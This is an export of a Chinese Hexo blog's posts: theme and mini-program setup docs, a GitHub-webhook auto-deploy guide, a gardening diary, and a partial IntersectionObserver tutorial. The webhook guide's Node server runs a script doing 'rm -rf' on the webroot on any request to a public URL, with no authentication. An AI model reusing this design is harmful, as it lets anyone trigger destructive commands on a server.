<p>创建文章时，在文章的 <code>Front-matter</code> 中使用 <code>categories</code> 字段添加标签即可：</p>
<pre><code class="markdown">---
title: zhaoo - 主题使用文档
categories:  #设置分类
- 项目
- 博客
---</code></pre>
<h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>执行以下命令创建关于页面，会在 <code>source</code> 目录生成 <code>about/index.md</code> 文件：</p>
<pre><code class="bash">$ hexo new page about  #创建关于页面</code></pre>
<p>打开 <code>source/about/index.md</code> 文件，设置 <code>Front-matter</code> ，开启关于页面：</p>
<pre><code class="markdown">---
title: 标签
type: &quot;about&quot;
layout: &quot;about&quot;
---</code></pre>
<p>参考 <a href="#导航菜单">导航菜单</a> 设置关于页面的导航：</p>
<pre><code class="yml">menu:
  about: /about || 关于</code></pre>
<p>在 <code>source/about/index.md</code> 中编写关于内容，如同写文章一样。</p>
<p>tips: 建议在 <strong>关于页面</strong> 关闭 <em>文章目录</em> 和 <em>文章版权</em> 功能，在 <code>Front-matter</code> 中添加 <code>toc</code> 和 <code>copyright</code> 字段都设置为 <code>false</code> 即可。</p>
<h2 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h2><h3 id="评论系统"><a href="#评论系统" class="headerlink" title="评论系统"></a>评论系统</h3><p>配置项 <code>comments</code> 用于配置评论系统，目前支持 <strong>Gitalk</strong>、<strong>Valine</strong>、<strong>畅言</strong> 三种评论系统。</p>
<pre><code class="yml"># Comment
comments:
  enable: true
  type: valine
  button: true</code></pre>
<ul>
<li><code>enable</code>:  <em>开启</em> / <em>关闭</em> 评论功能。</li>
<li><code>type</code>: 开启哪种评论系统，需要配置对应的评论系统。（参考下文）</li>
<li><code>button</code>: <em>显示</em> / <em>隐藏</em> 评论按钮，隐藏按钮后将直接展示评论。</li>
</ul>
<h4 id="Gitalk"><a href="#Gitalk" class="headerlink" title="Gitalk"></a>Gitalk</h4><p><strong>Gitalk</strong> 基于 <code>GitHub</code> 存储评论内容，优点是支持 <code>GitHub</code> 直接登录；缺点是需要 <strong>科学上网</strong> 才能访问，水土不服。</p>
<p><img  src="https://pic.izhaoo.com/2020111982651.jpg"  ><span class="image-caption">Gitalk演示</span></p>
<p>首先需要在 <a href="https://github.com/new">GitHub</a> 创建一个仓库，如有 <code>GitHub Pages</code> 也可以共用一个仓库。</p>
<p><img  src="https://pic.izhaoo.com/202011193006.jpg"  ><span class="image-caption">创建仓库</span></p>
<p>接着创建一个 <a href="https://github.com/settings/applications/new">Github Application</a>，填写相应的参数。创建完成后会生成 <code>clientID</code> 和 <code>clientSecret</code>，记录一下。</p>
<p><img  src="https://pic.izhaoo.com/20201119203435.png"  ><span class="image-caption">创建应用</span></p>
<p>配置项 <code>gitalk</code> 用于配置 <code>Gitalk。</code></p>
<pre><code class="yml"># Gitalk
gitalk:
  owner:
  repo:
  admin:
  clientID:
  clientSecret:</code></pre>
<ul>
<li><code>owner</code>: <code>GitHub</code> 的用户名。</li>
<li><code>repo</code>: 创建的仓库名称。</li>
<li><code>admin</code>: <code>GitHub</code> 的用户名。</li>
<li><code>clientID</code>: 应用创建后生成。</li>
<li><code>clientSecret</code>: 应用创建后生成。</li>
</ul>
<h4 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a>Valine</h4><p><code>Valine</code> 是基于 <a href="https://leancloud.cn/">LeanCloud</a> 实现的评论系统，小清新风格。</p>
<p><img  src="https://pic.izhaoo.com/2020111980022.jpg"  ><span class="image-caption">Valine演示</span></p>
<p>首先在 <a href="https://leancloud.cn/">LeanCloud</a> 注册一个账号，并创建一个应用（开发版）。</p>
<p>进入应用管理界面，点击【存储】-&gt;【创建Class】，名称为 <strong>Comment</strong>，访问权限为 <strong>所有用户</strong>，写入权限为 <strong>限制写入</strong>。</p>
<p>在【设置】-&gt;【应用Keys】中复制 <code>appId</code> 和 <code>appKey</code>。</p>
<p>配置项 <code>valine</code> 用于设置 <code>Valine</code> 评论系统。</p>
<pre><code class="yml"># Valine
valine:
  appId:
  appKey:
  placeholder: 雁过留痕
  avatar: mp
  pageSize: 10
  lang: zh-CN</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> <code>Valine</code>。</li>
<li><code>appId</code>: 填入刚才得到的 <code>appId</code>。</li>
<li><code>appKey</code>: 填入刚才得到的 <code>appKey</code>。</li>
<li><code>placeholder</code>: 未输入评论时的占位文字。</li>
<li><code>mp</code>: 默认头像，参考 <a href="https://valine.js.org/avatar.html">Valine头像设置</a>。</li>
<li><code>pageSize</code>: 每页评论数量。</li>
<li><code>lang</code>: 系统语言。</li>
</ul>
<blockquote>
<p><a href="https://valine.js.org/">Valine</a></p>
</blockquote>
<h4 id="畅言"><a href="#畅言" class="headerlink" title="畅言"></a>畅言</h4><p><strong>畅言</strong> 是搜狐家的评论系统，优点是支持 <code>QQ</code>、<code>手机</code>、<code>邮箱</code> 等多种登录方式，接地气；个人感觉 <code>UI</code> 不是我的菜。 </p>
<p><img  src="https://pic.izhaoo.com/2020111984224.jpg"  ><span class="image-caption">畅言演示</span></p>
<p>在 <a href="http://changyan.kuaizhan.com/">畅言</a> 注册账号，进入后台创建一个站点，在【后台总览】记录一下 <code>APP ID</code> 和 <code>APP KEY</code>。</p>
<p>配置项 <code>changyan</code> 用于设置 <code>畅言评论</code>。</p>
<pre><code class="yml"># ChangYan
changyan:
  appId:
  conf:</code></pre>
<ul>
<li><code>appId</code>: 生成的 <code>APP ID</code>。</li>
<li><code>conf</code>: 生成的 <code>APP KEY</code>。</li>
</ul>
<p>畅言的相关配置在【管理后台】设置，可参考官方文档进行配置。</p>
<h3 id="客户沟通-DaoVoice"><a href="#客户沟通-DaoVoice" class="headerlink" title="客户沟通 (DaoVoice)"></a>客户沟通 (DaoVoice)</h3><p><a href="http://www.daovoice.io/">DaoVoice</a> 是一款客户沟通插件，支持即时通讯、留言等形式反馈消息。</p>
<p><img  src="https://pic.izhaoo.com/20200808141245.jpg"  ><span class="image-caption">DaoVoice演示</span></p>
<p>因为官方的 <code>Fab</code> 按钮 和 主题 <code>Fab</code> 按钮会重叠，所以作者同学把他集成到主题 <code>Fab</code> 中了。</p>
<p><img  src="https://pic.izhaoo.com/20200808141349.jpg"  ><span class="image-caption">官网Fab</span></p>
<p><img  src="https://pic.izhaoo.com/20200808141304.jpg"  ><span class="image-caption">主题Fab</span></p>
<p>首先在 <a href="http://dashboard.daovoice.io/">DaoVoice</a> 官网上注册一个账号。</p>
<p>在【安装应用】页面，复制 <code>app_id</code>。</p>
<p><img  src="https://pic.izhaoo.com/20200808135815.jpg"  ><span class="image-caption">appid</span></p>
<p>配置项 <code>daovoice</code> 配置应用。</p>
<pre><code class="yml"># Daovoice
daovoice:
  enable: true
  appId: abcdefg  #你的 app_id</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> DaoVoice。</li>
<li><code>appId</code>: 填写之前复制的 <code>app_id</code>。</li>
</ul>
<p>点击 <code>Fab</code> 中的 <strong>消息图标</strong> 即可打开。</p>
<h3 id="意见反馈平台-腾讯兔小巢"><a href="#意见反馈平台-腾讯兔小巢" class="headerlink" title="意见反馈平台 (腾讯兔小巢)"></a>意见反馈平台 (腾讯兔小巢)</h3><p><a href="https://txc.qq.com/">腾讯兔小巢</a> 是一款用户意见反馈平台。</p>
<p>首先在 <a href="https://txc.qq.com/">腾讯兔小巢</a> 官网上注册一个产品，在 <a href="https://txc.qq.com/dashboard/products/">产品设置</a> 中复制 <code>ID</code>。</p>
<p>配置项 <code>tencentChao</code> 用于配置兔小巢。</p>
<pre><code class="yml"># Tencent Chao
tencentChao:
  enable: false
  appId: # app_id</code></pre>
<ul>
<li><code>enable</code>:  <em>开启</em> / <em>关闭</em> 兔小巢。</li>
<li><code>appId</code>: 填写之前复制的 <code>ID</code>。</li>
</ul>
<h3 id="页面统计-LeanCloud"><a href="#页面统计-LeanCloud" class="headerlink" title="页面统计 (LeanCloud)"></a>页面统计 (LeanCloud)</h3><p><strong>LeanCloud</strong> 是一款 <code>ServerLess</code> 服务，主题中被用来统计每个页面的访问量，并在页面中展示。</p>
<p>首先在 <a href="https://leancloud.cn/">LeanCloud</a> 注册一个账号，并创建一个应用（开发版）。</p>
<p>进入应用管理界面，点击【存储】-&gt;【创建Class】，名称为 <strong>Counter</strong>，访问权限为 <strong>所有用户</strong>，写入权限为 <strong>限制写入</strong>，如下：</p>
<p><img  src="https://pic.izhaoo.com/202011194911.jpg"  ><span class="image-caption">创建LeanCloud</span></p>
<p>在【设置】-&gt;【应用Keys】中复制 <code>appId</code> 和 <code>appKey</code>。</p>
<p>配置项 <code>leancloud</code> 用于设置 <code>LeanCloud</code>。</p>
<pre><code class="yml"># LeanCloud
leancloud:
  enable: true
  appId:
  appKey:
  serverURLs: https://leancloud.cn/</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> <code>LeanCloud</code>。</li>
<li><code>appId</code>: 填入刚才得到的 <code>appId</code>。</li>
<li><code>appKey</code>: 填入刚才得到的 <code>appKey</code>。</li>
<li><code>serverURLs</code>: 服务路径不用改，保持 <code>https://leancloud.cn/</code> 就可以了。</li>
</ul>
<h3 id="图片懒加载-LazyLoad"><a href="#图片懒加载-LazyLoad" class="headerlink" title="图片懒加载 (LazyLoad)"></a>图片懒加载 (LazyLoad)</h3><p>配置项 <code>lazyload</code> 用于配置图片懒加载。</p>
<pre><code class="yml"># Lazyload
lazyload:
  enable: true
  only_post: false
  loading: /images/theme/loading.gif</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 图片懒加载。</li>
<li><code>onlyPost</code>: 只对对文章中的图片开启懒加载功能。</li>
<li><code>loading</code>: 加载动画，默认是开启 <code>placeholder（占位图）</code> 的，可以在网上下载喜欢的动图，填写 <code>图片URL</code> 即可。</li>
</ul>
<h3 id="图片灯箱-FancyBox"><a href="#图片灯箱-FancyBox" class="headerlink" title="图片灯箱 (FancyBox)"></a>图片灯箱 (FancyBox)</h3><p>配置项 <code>FancyBox</code> 用于设置图片灯箱效果，开启后点击文章中的图片会以幻灯片的形式播放。</p>
<pre><code class="yml">fancybox: true</code></pre>
<h3 id="无刷新加载-PJAX"><a href="#无刷新加载-PJAX" class="headerlink" title="无刷新加载 (PJAX)"></a>无刷新加载 (PJAX)</h3><p>配置项 <code>pjax</code> 用于设置无刷新加载，开启后让你的博客嗖嗖嗖~</p>
<pre><code class="yml">pjax: true</code></pre>
<p>tips: 该功能暂时不稳定，会引起一些特效、功能的异常，暂时不建议开启。</p>
<h3 id="代码高亮-HighLight"><a href="#代码高亮-HighLight" class="headerlink" title="代码高亮 (HighLight)"></a>代码高亮 (HighLight)</h3><p>在 <strong>博客配置</strong> 中开启代码高亮效果：</p>
<pre><code class="yml">highlight:
  enable: true  #启用代码高亮效果
  line_number: true
  auto_detect: true
  hljs: true
  tab_replace:</code></pre>
<p>配置项 <code>highlight</code> 用于设置代码高亮效果。</p>
<pre><code class="yml"># HighLight
highlight:
  enable: true
  style: # https://highlightjs.org/static/demo/
    light: Xcode
    dark: Solarized Dark</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 代码高亮。</li>
<li><code>style -&gt; light</code>: <em>浅色模式</em> 时的高亮样式。</li>
<li><code>style -&gt; dark</code>: <em>深色模式</em> 时的高亮样式。</li>
</ul>
<p>可以到 <a href="https://highlightjs.org/static/demo/">官网</a> 预览高亮效果，填写样式名称即可。</p>
<h3 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h3><p>配置项 <code>seo</code> 用于设置 SEO（网站关键词优化）功能。</p>
<pre><code class="yml"># SEO
seo:
  baidu_auto_push: true</code></pre>
<ul>
<li><code>baidu_auto_push</code>: 开启 <a href="https://ziyuan.baidu.com/linksubmit/index">百度站长平台</a> 链接自动推送功能。</li>
</ul>
<h3 id="网页统计"><a href="#网页统计" class="headerlink" title="网页统计"></a>网页统计</h3><p>配置项 <code>analytics</code> 用于设置网站统计。</p>
<pre><code class="yml"># Analytics
analytics:
  baidu: # id
  google: # id
  tencent: # id
  cnzz: # id</code></pre>
<ul>
<li><code>baidu</code>: <a href="https://tongji.baidu.com/web/welcome/login">百度统计</a></li>
<li><code>google</code>: <a href="https://analytics.google.com/analytics/web">谷歌统计</a></li>
<li><code>tencent</code>: <a href="https://ta.qq.com/#/">腾讯分析</a></li>
<li><code>cnzz</code>: <a href="https://www.umeng.com/web">友盟统计</a></li>
</ul>
<p>在对应的数据统计官网注册网站应用，复制对应的 <code>id</code> 填写即可。</p>
<h2 id="脚本配置"><a href="#脚本配置" class="headerlink" title="脚本配置"></a>脚本配置</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>对于外部静态文件（CSS 或 JS），可以使用第三方 <code>CDN</code> 库进行优化加速。</p>
<p>配置项 <code>vendors</code> 用于设置静态库引入位置，直接输入 <code>URL</code> 即可。您可以保持默认配置（BootCDN）,留空则从本地引入。</p>
<pre><code class="yml">vendors:
  jquery_js: https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js
  fancybox_js: https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js
  pjax_js: https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js
  lazyload_js: https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js
  fancybox_css: https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css
  highlight_css: https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css
  iconfont_css: //at.alicdn.com/t/font_1445822_58xq2j9v1id.css</code></pre>
<h3 id="脚本埋点"><a href="#脚本埋点" class="headerlink" title="脚本埋点"></a>脚本埋点</h3><p>有时候我们需要埋入一些第三方脚本，例如 <code>百度统计</code>、<code>百度SEO</code> 等，主题在 <strong>头部</strong> 和 <strong>尾部</strong> 分别开放了埋点入口，通过配置项 <code>custom</code> 进行配置。</p>
<pre><code class="yml"># Custom
custom:
  head:
  foot:
  css:
  js:</code></pre>
<ul>
<li><code>head</code>: 引入头部的代码。</li>
<li><code>foot</code>: 引入尾部的代码。</li>
<li><code>css</code>: 外部引入的 <code>CSS</code> 链接。</li>
<li><code>js</code>: 外部引入的 <code>JS</code> 链接。</li>
</ul>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>主题</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序部署文档</title>
    <url>/2021/07/05/hexo-weapp-zhaoo-doc/</url>
    <content><![CDATA[<p><code>zhaoo</code> 主题孪生小程序的相关部署文档。</p>
<span id="more"></span>

<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img  src="https://pic.izhaoo.com/weapp-code.jpg"  ><span class="image-caption">hexo-weapp-zhaoo</span></p>
<h2 id="关于文档"><a href="#关于文档" class="headerlink" title="关于文档"></a>关于文档</h2><blockquote>
<p>如有疑惑欢迎加鹅群咨询：<strong>550262893</strong><br>需要使用者具备一丢丢的前端基础。</p>
</blockquote>
<p style="text-align: right;">文档更新于：2021年07月05日</p>

<h2 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先需要使用 <a href="https://github.com/zhaoo/hexo-generator-restful-zhaoo">hexo-generator-restful-zhaoo</a> 插件生成 RESTful 接口，为小程序提供后端服务。</p>
<p><code>cd</code> 到博客根目录，执行以下命令安装插件：</p>
<pre><code class="bash">$ npm install hexo-generator-restful-zhaoo --save  # 安装插件
$ hexo g  # 生成静态页面</code></pre>
<p>生成静态页面后可在 <code>public</code> 目录下找到 <code>api</code> 目录，里面存放的是一些 <code>json</code> 格式的文本数据，直接访问这些 <code>json</code> 文件即可调用接口。</p>
<p><img  src="https://pic.izhaoo.com/20210705142146.jpg"  ><span class="image-caption">调用接口</span></p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>该插件暴露了一些配置项供用户进行自定义配置，在博客根目录下的 <code>_config.yml</code> 配置文件末尾插入以下内容进行配置：</p>
<pre><code class="yml"># 以下为缺省默认项

restful:
  # site 可配置为数组选择性生成某些属性
  # site: [&#39;title&#39;, &#39;subtitle&#39;, &#39;description&#39;, &#39;author&#39;, &#39;since&#39;, email&#39;, &#39;favicon&#39;, &#39;avatar&#39;]
  site: true        # hexo.config mix theme.config
  posts_size: 10    # 文章列表分页，0 表示不分页
  posts_props:      # 文章列表项的需要生成的属性
    title: true
    slug: true
    date: true
    updated: true
    comments: true
    path: true
    excerpt: false
    cover: true      # 封面图，取文章第一张图片
    content: false
    keywords: false
    categories: true
    tags: true
  categories: true         # 分类数据
  use_category_slug: false # Use slug for filename of category data
  tags: true               # 标签数据
  use_tag_slug: false      # Use slug for filename of tag data
  post: true               # 文章数据
  pages: false             # 额外的 Hexo 页面数据, 如 About
  galleries: false         # 相册数据 </code></pre>
<p>修改配置项后需要使用 <code>hexo g</code> 命令重新生成页面。</p>
<h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>首先需要在<a href="https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&lang=zh_CN&token=">微信公众平台</a>注册一个小程序，填写基本信息即可。</p>
<p><img  src="https://pic.izhaoo.com/20210705195454.jpg"  ><span class="image-caption">注册小程序</span></p>
<p>注册完成后进入后台，在 <em>设置 → 基本设置</em> 中可以获取到 <strong>AppID</strong>，后面会使用到。</p>
<p>在 <em>开发 → 开发管理 → 开发设置</em> 中添加 <em>request合法域名</em>，否则会被拦截，需要添加以下域名：</p>
<ol>
<li>RESTful 接口域名（例如：<a href="https://www.izhaoo.com）">https://www.izhaoo.com）</a></li>
<li><a href="https://api.leancloud.cn">https://api.leancloud.cn</a> （第三方数据统计服务）</li>
</ol>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><blockquote>
<p>小程序基于 <a href="https://taro.aotu.io/">Taro</a> 开发，建议阅读 <a href="https://taro-docs.jd.com/taro/docs/README">Taro 官方文档</a> 了解更多姿势。</p>
</blockquote>
<p>首先需要安装 Taro <strong>（安全起见，建议安装 3.2.1 版本）</strong>：</p>
<pre><code class="bash">$ npm install -g @tarojs/cli@3.2.1  # 安装 Taro
$ npm info @tarojs/cli  # 查看 Taro 版本</code></pre>
<p>在任意目录下拉取 <a href="https://github.com/zhaoo/hexo-weapp-zhaoo">hexo-weapp-zhaoo</a> 最新代码（直接打包下载也行）：</p>
<pre><code class="bash">$ git clone https://github.com/zhaoo/hexo-weapp-zhaoo.git</code></pre>
<p>执行以下命令打包小程序：</p>
<pre><code class="bash">$ cd client  # 移动到客户端目录
$ npm run build:weapp  # 打包</code></pre>
<p>执行后会在当前目录下生成 <code>dist</code> 目录（小程序编译目标）。</p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>打开根目录下的 <code>project.config.json</code> 文件，将其中的 <code>appid</code> 项修改为刚才注册小程序得到的 <strong>AppID</strong>。</p>
<p>修改 <code>/client/config.json</code> 中的相关配置，说明如下：</p>
<ul>
<li>baseUrl: 接口地址，例如：<a href="https://www.izhaoo.com/api">https://www.izhaoo.com/api</a></li>
<li>webUrl: 网页博客地址（用于 WebView 跳转），例如：<a href="https://www.izhaoo.com">https://www.izhaoo.com</a></li>
<li>donate: 打赏二维码图片地址</li>
</ul>
<p>修改配置后需要重新打包。</p>
<h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>首先下载 <a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">微信小程序开发工具</a>。</p>
<p>打开开发工具，新建项目，项目目录设置为 <code>hexo-weapp-zhaoo</code> 所在目录即可，点击【新建】完成项目创建。</p>
<p><img  src="https://pic.izhaoo.com/20210705202742.jpg"  ><span class="image-caption">新建项目</span></p>
<p>打开项目后可以进行 <em>预览</em> 或 <em>真机调试</em>，确认没问题后点击右侧的【上传】按钮，设置版本号，即可将小程序代码上传至云端。</p>
<p><img  src="https://pic.izhaoo.com/20210705203106.jpg"  ><span class="image-caption">上传小程序</span></p>
<p>网页打开微信公众平台后台，在 <em>管理 → 版本管理</em> 处将 <em>开发版本</em> 提交审核，审核通过后即可设置为 <em>正式版本</em>，至此小伙伴们就可以访问到你的小程序啦。</p>
<p><img  src="https://pic.izhaoo.com/20210705203440.jpg"  ><span class="image-caption">提交审核</span></p>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 自动部署博客</title>
    <url>/2021/08/29/hexo-webhook/</url>
    <content><![CDATA[<p>基于 GitHub-Webhooks 自动拉取并部署博客。</p>
<span id="more"></span>

<p>兆兆博客部署在宝塔面板上，每次部署时都要登录面板、上传文件，贼麻烦。燃鹅每次都忍了…终于有一天，忍无可忍了！</p>
<p>比较方便的方式可以通过 GitHub-Webhooks 设置钩子，在向 GitHub 远程仓库提交代码时，使用 webhook 向服务器发送请求，自动拉取代码更新博客。</p>
<p>在服务器的 <code>webroot</code> 目录下新建两个文件：</p>
<pre><code class="javascript">// webhook.js

const http = require(&#39;http&#39;);
const util = require(&#39;util&#39;);
const child_process = require(&#39;child_process&#39;);

const exec = util.promisify(child_process.exec);
const port = 3000;  //配置端口
const host = &#39;localhost&#39;;  //配置域名
const matchUrl = &#39;/webhook&#39;;  //配置路由

const server = http
  .createServer(async (request, response) =&gt; &#123;
    try &#123;
      const url = request.url;
      if (url === matchUrl) &#123;
        await exec(&#39;sh webhook.sh&#39;);  //执行当前目录下的脚本
        response.write(&#39;Hexo webhook executed successfully&#39;);
        response.end();
      &#125; else &#123;
        response.write(`Hexo webhook running at: http://$&#123;host&#125;:$&#123;port&#125;$&#123;matchUrl&#125;`);
        response.end();
      &#125;
    &#125; catch (e) &#123;
      console.error(e);
    &#125;
  &#125;)
  .listen(port, host, () =&gt; &#123;
    console.log(`Hexo webhook running at: http://$&#123;host&#125;:$&#123;port&#125;$&#123;matchUrl&#125;`);
  &#125;);</code></pre>
<pre><code class="sh"># webhook.sh
#!/usr/bin/env bash

rm -rf ~/www/wwwroot/zhaoo/*
cd ~/www/wwwroot/zhaoo/
git pull https://github.com/zhaoo/zhaoo.github.io.git</code></pre>
<p>在宝塔面板的软件商店中安装 <em>PM2管理器</em>，运行 JavaScript 脚本：</p>
<p><img  src="https://pic.izhaoo.com/20210829204722.jpg"  ><span class="image-caption">配置 PM2</span></p>
<p>现在脚本是运行在 <code>http://localhost:3000</code> 下，外网无法访问，使用我们需要配置一个反向代理：</p>
<p><img  src="https://pic.izhaoo.com/20210829204907.jpg"  ><span class="image-caption">配置反向代理</span></p>
<p>默认是整个域名进行转发，会导致博客无法访问，所以需要修改下 Nginx 配置，只转发 <code>/webhook</code> 路由。</p>
<p><img  src="https://pic.izhaoo.com/20210829205136.jpg"  ><span class="image-caption">配置 Nginx</span></p>
<p>现在访问一下 <code>https://www.izhaoo.com/webhook/</code>，successfully！现在只需访问一次该 URL，服务器便会自动从 GitHub 拉取代码并更新博客。</p>
<p>最后只需要在 GitHub 配置一下 Webhooks 即可，向 GitHub 推代码时会自动向服务器发送请求。</p>
<p><img  src="https://pic.izhaoo.com/20210829205527.jpg"  ><span class="image-caption">配置 Webhooks</span></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>兆兆的香菜观察日记</title>
    <url>/2021/08/15/growing-coriander-diary/</url>
    <content><![CDATA[<p>我种下一颗种子，终于长出了果实，今天是个伟大日子。<br>摘下香菜炒个蛋，摘下香菜煲个汤，让香菜每天为你甜蜜。</p>
<span id="more"></span>

<p><strong>2021.08.14</strong></p>
<p>今天是个下雨的七夕劫，适合“播种”。女朋友送了几包香菜种子，还有来自长白山的泥土。我将用我的勤劳的双手，将它们变成香菜炒蛋。</p>
<p><img  src="https://pic.izhaoo.com/20210815193431.jpg"  ><span class="image-caption">装备</span></p>
<p><img  src="https://pic.izhaoo.com/20210815193457.jpg"  ><span class="image-caption">松土</span></p>
<p><img  src="https://pic.izhaoo.com/20210815193521.jpg"  ><span class="image-caption">播种</span></p>
<p>就这么简单，欲知后事如何，咱们下期再会。</p>
<p><strong>2021.08.19</strong></p>
<p>这两天参加公司训练营，每天早出晚归，无暇在人间逗留。今晚无意瞥到香菜苗苗居然 🌱 了，可喜可贺。By the way，小伙伴们很给力</p>
<p><img  src="https://pic.izhaoo.com/20210820000445.jpg"  ><span class="image-caption">🌱</span></p>
<p><strong>2021.08.21</strong></p>
<p>今天已经长成小苗苗了，炒一碗香菜苗。</p>
<p><img  src="https://pic.izhaoo.com/20210821210653.jpg"  ><span class="image-caption">小苗苗</span></p>
<p><strong>2021.08.26</strong></p>
<p>这两天海豹训练营太卷了，每天肝到十二点，只能让你暗里生长了。</p>
<p><img  src="https://pic.izhaoo.com/20210826011732.jpg"  ><span class="image-caption">暗里</span></p>
<p><img  src="https://pic.izhaoo.com/20210826011747.jpg"  ><span class="image-caption">生长</span></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>阳台种菜</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>IntersectionObserver</title>
    <url>/2021/08/03/intersection-observer/</url>
    <content><![CDATA[<p>IntersectionObserver API 用于监听元素与父元素或视口的可视状态，分享一些日常开发中的实际应用案例。</p>
<span id="more"></span>

<h3 id="MDN"><a href="#MDN" class="headerlink" title="MDN"></a>MDN</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserver">IntersectionObserver</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserverEntry">IntersectionObserver Entry</a></p>
<blockquote>
<p><em>IntersectionObserver</em> 用于异步观察目标元素与父元素可视状态。</p>
</blockquote>
<p>polyfill: tnpm install intersection-observer</p>
<p><strong>base</strong></p>
<pre><code class="javascript">const observer = new IntersectionObserver(callback, options);

observer.observe();  //开始监听目标元素
observer.unobserve();  //取消监听目标元素
observer.takeRecords();  //返回所以观察目标的entries对象数组
observer.disconnect();  //停止所有监听</code></pre>
<p><strong>callback</strong></p>
<pre><code class="javascript">const observer = new IntersectionObserver((entries) =&gt; &#123;
  entries.forEach((entry) =&gt; &#123; 
    console.log(entry.isIntersecting);  //目标元素进入可见区域或离开可见区域
  &#125;);
&#125;);</code></pre>
<ul>
<li>isIntersecting: 目标元素进入可视区域或离开可见区域</li>
<li>intersectionRatio: 目标元素在可视区域的比例</li>
<li>intersectionRect: 目标元素与根元素的相交区域</li>
<li>boundingClientRect: 目标元素的边界区域，同 <em>getBoundingClientRect()</em></li>
<li>rootBounds: 返回交叉区域观察者中的根</li>
<li>target: 触发时的目标元素</li>
<li>time: 触发时的时间戳</li>
</ul>
<p><strong>options</strong></p>
<pre><code class="javascript">const observer = new IntersectionObserver(callback, &#123;
  root: document.getElementById(&quot;container&quot;),  //父容器为container
  rootMargin: &quot;10px, 10px, 10px, 10px&quot;,  //父容器内缩10px为计算边界
  threshold: 1  //较差比例为100%时触发
&#125;);</code></pre>
<ul>
<li>root: 监听对象的父元素，未指定则默认为根元素（root）</li>
<li>rootMargin: 计算时的边界偏移量，可以放大/缩小计算容器</li>
<li>threshold: 监听对象与父元素交叉比例触发阈值（0~1）</li>
</ul>
<h3 id="吸顶吸底"><a href="#吸顶吸底" class="headerlink" title="吸顶吸底"></a>吸顶吸底</h3><p><img  src="https://pic.izhaoo.com/20210801222344gif.gif"  ><span class="image-caption">吸顶效果</span></p>
<p>最近的一个业务需求中需要实现 TabBar 吸顶能力。对于简单的吸顶，我们直接用 <code>position: sticky;</code> 即可。但是视觉同学要求在吸顶的时候 TabBar 的样式也做相应的变化，这就需要我们去监听吸顶状态。通过监听滚动事件，计算父子元素的相对距离，从而判读是否吸顶，代码如下：</p>
<pre><code class="jsx">export default function Tabbar() &#123;
  const [isFixed, setIsFixed] = useState(false);

  useEffect(() =&gt; &#123;
    window.addEventListener(
      &quot;scroll&quot;, () =&gt; &#123;
        const rect = document.getElementById(&quot;tabbar&quot;) &amp;&amp; document.getElementById(&quot;tabbar&quot;).getBoundingClientRect();  //获取元素高度
        setIsFixed(rect.top &lt;= 0 ? true : false);  //吸顶状态更新
      &#125;, true  //Rax中屏蔽了冒泡事件，需要在捕获阶段监听事件
    );
  &#125;, []);  

  return (
    &lt;View className=&quot;container&quot;&gt;
      &lt;Tabbar className=`tabbar $&#123;isFixed ? &quot;tabbar--fixed&quot; : null&#125;` id=&quot;tabbar&quot; /&gt;
    &lt;/View&gt;
  )
&#125;</code></pre>
<pre><code class="css">.tabbar &#123;
  position: sticky;  /* 粘性定位 */
  left: 0;
  top: 0;
  ...  /* 未吸顶样式 */
&#125;

.abbar--fixed &#123;
  ...  /* 吸顶样式 */
&#125;</code></pre>
<p>虽然完美还原了视觉效果，但是一个简单的吸附判断需要添加滚动监听和状态机，对页面性能影响不小。并且还遇到了小坑：沉浸式 <em>TitleBar</em> 通过监听页面滚动切换效果，给了页面一个滚动层级，导致无法监听到元素的 <em>scrollTop</em> 属性，需要 Hack 处理。复盘的时候使用 <em>IntersectionObserver</em> 重构了一下，通过监听 Tabbar 元素与容器元素之间的交叉状态判断是否吸顶。看起来逼格提升了一个档次，代码如下：</p>
<pre><code class="jsx">export default function Tabbar() &#123;
  useEffect(() =&gt; &#123;
    if (containerRef.current &amp;&amp; tabbarRef.current) &#123;
